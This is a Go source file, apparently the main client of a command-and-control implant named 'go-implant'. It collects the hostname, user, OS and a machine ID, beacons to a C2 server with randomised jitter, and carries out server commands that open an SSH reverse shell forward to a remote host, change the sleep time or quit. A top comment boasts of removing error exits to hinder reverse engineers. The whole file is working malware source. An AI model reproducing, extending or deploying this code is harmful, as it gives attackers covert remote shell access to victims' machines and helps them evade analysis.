/*
 *  and Fatalf's should be replaced with just os.exits - naw just remove them to keep reversers busy
 */

package main

import (
	"go-implant/client/beaconing"
	"go-implant/client/config"
	"go-implant/client/ssh"
	"go-implant/common/communication"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	"github.com/denisbrodbeck/machineid"
)

var taskchannels = []chan struct{}{} // channels for ssh tasks

func main() {

	runtime.GOMAXPROCS(runtime.NumCPU()) // use all logical cores available
	rand.Seed(time.Now().Unix())         // initialize global pseudo random generator
	initVars()                           // init values that get sent in beacon (UID, hostname, currentuser, os info)

	retries := 0

	// loop forever
	for {

		// check if there has been too many retries
		if (config.Retries == 0 && retries > 0) || (config.Retries > 0 && retries >= config.Retries) {
			if config.DEBUG {
				log.Println("Retries exceeded, exiting")
			}
			return
		}

		// choose an endpoint randomly
		endpoint := config.CCHost + config.Endpoints[rand.Intn(len(config.Endpoints))]

		// sleep random time [sleeptime - jitter, sleeptime + jitter]
		sleeptime := rand.Intn((config.Sleeptime+config.Jitter)-(config.Sleeptime-config.Jitter)) + config.Sleeptime - config.Jitter
		if config.DEBUG {
			log.Printf("Sleeping %d seconds", sleeptime)
		}
		time.Sleep(time.Duration(sleeptime) * time.Second)

		// Beacon
		msg, err := beaconing.DoBeacon(endpoint)
		if err != nil {
			if config.DEBUG {
				log.Printf("Error beaconing (%s)", err)
			}
			retries++
			continue
		}

		// parse received message
		var beaconresponse communication.BeaconResponse
		err = json.Unmarshal(msg, &beaconresponse)

		if err != nil {
			if config.DEBUG {
				log.Printf("Error parsing response (%s)", err)
			}
			continue
		}

		// iterate through all received commands
		for i := 0; i < len(beaconresponse.Commands); i++ {

			switch beaconresponse.Commands[i].Command {
			case communication.ServeSSH:
				// start serving ssh

				if config.DEBUG {
					log.Println("startSSH")
				}

				if len(beaconresponse.Commands[i].Args) != 8 {
					// incorrect amount of args
					if config.DEBUG {
						log.Println("Got incorrect amount of arguments!")
					}
					continue
				}

				localsshport, err := strconv.Atoi(beaconresponse.Commands[i].Args[0])
				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting localsshport to int (%s)", err)
					}
					continue
				}

				localsshusername := beaconresponse.Commands[i].Args[1]
				localsshpassword := beaconresponse.Commands[i].Args[2]
				remotesshusername := beaconresponse.Commands[i].Args[3]
				remotesshpassword := beaconresponse.Commands[i].Args[4]
				remotesshHost := beaconresponse.Commands[i].Args[5]

				remotesshPort, err := strconv.Atoi(beaconresponse.Commands[i].Args[6])
				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting remotesshPort to int (%s)", err)
					}
					continue
				}

				fromPort, err := strconv.Atoi(beaconresponse.Commands[i].Args[7])
				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting fromPort to int (%s)", err)
					}
					continue
				}

				newchan := make(chan struct{})
				taskchannels = append(taskchannels, newchan) // add new channel to the array
				go ssh.ForwardShell(newchan, localsshport, localsshusername, localsshpassword, remotesshusername, remotesshpassword, remotesshHost, remotesshPort, fromPort)

			case communication.StopSSH:
				// stop all sshs
				if config.DEBUG {
					log.Println("stopSSH")
				}
				stoptasks()

			case communication.SetSleeptime:
				// change sleeptime

				if config.DEBUG {
					log.Println("setSleeptime")
				}
				newsleeptime, err := strconv.Atoi(beaconresponse.Commands[i].Args[0])

				if err != nil {
					if config.DEBUG {
						log.Printf("Error converting newsleeptime to int (%s)", err)
					}
					continue
				}

				config.Sleeptime = newsleeptime

			case communication.Quit:
				// should stop
				if config.DEBUG {
					log.Println("Quit")
				}
				stoptasks()
				return
			default:
				if config.DEBUG {
					log.Println("UNKNOWN Command: " + beaconresponse.Commands[i].Command)
				}
			}
		}
	}
}

// stop all tasks
func stoptasks() {
	for i := 0; i < len(taskchannels); i++ {
		close(taskchannels[i]) // stop all running goroutines
	}

	// remove the closed channels from the array
	taskchannels = []chan struct{}{}
}

// Init facts about this host
func initVars() {

	// get OS info
	beaconing.OSINFO = runtime.GOOS + " " + runtime.GOARCH

	// get hostname
	hostname, err := os.Hostname()
	if config.DEBUG {
		if err != nil {
			log.Printf("Could not get hostname (%s)", err)
		}
	}
	beaconing.HOSTNAME = hostname

	// get current user
	user, err := user.Current()
	if config.DEBUG {
		if err != nil {
			log.Printf("Could not get current user (%s)", err)
		}
	}
	beaconing.USERNAME = user.Username

	// generate UID
	id, _ := machineid.ID()
	if config.DEBUG {
		if err != nil {
			log.Printf("Could not generate machine id (%s)", err) // this could be caused if we're inside docker
		}
	}

	mac := hmac.New(sha256.New, []byte(id))
	mac.Write([]byte(user.Username + hostname))
	beaconing.UID = fmt.Sprintf("%x", mac.Sum(nil))
}
